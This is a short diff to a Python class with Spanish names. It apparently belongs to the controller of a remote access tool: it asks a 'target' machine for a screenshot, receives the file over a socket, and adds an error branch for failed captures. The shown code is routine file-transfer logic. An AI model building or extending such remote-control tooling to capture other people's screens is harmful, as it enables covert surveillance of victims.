@@ -460,17 +460,24 @@ class Control():
 		self.servidor.enviar(self.objetivo,"nombre")
 		nombre_archivo = self.servidor.recibir(self.objetivo)
 
-		self.servidor.enviar(self.objetivo,'size')
-		size = int(self.servidor.recibir(self.objetivo))
 
-		with open("screenshots/"+nombre_archivo,"wb") as archivo:
-			while (size>0):
-				contenido = self.objetivo.recv(1024)
-				archivo.write(contenido)
-				size-=len(contenido)
+		if (nombre_archivo!="failed"):
+
+			self.servidor.enviar(self.objetivo,'size')
+			size = int(self.servidor.recibir(self.objetivo))
+
+			with open("screenshots/"+nombre_archivo,"wb") as archivo:
+				while (size>0):
+					contenido = self.objetivo.recv(1024)
+					archivo.write(contenido)
+					size-=len(contenido)
 
 
-		print (" [\033[1;32m+\033[0;39m] La captura se guardo en: screenshots/"+nombre_archivo)
+			print (" [\033[1;32m+\033[0;39m] La captura se guardo en: screenshots/"+nombre_archivo)
+
+		else:
+			print (" [\033[1;31mx\033[0;39m] No se pudo capturar la imagen.")
+
 
 		return
 
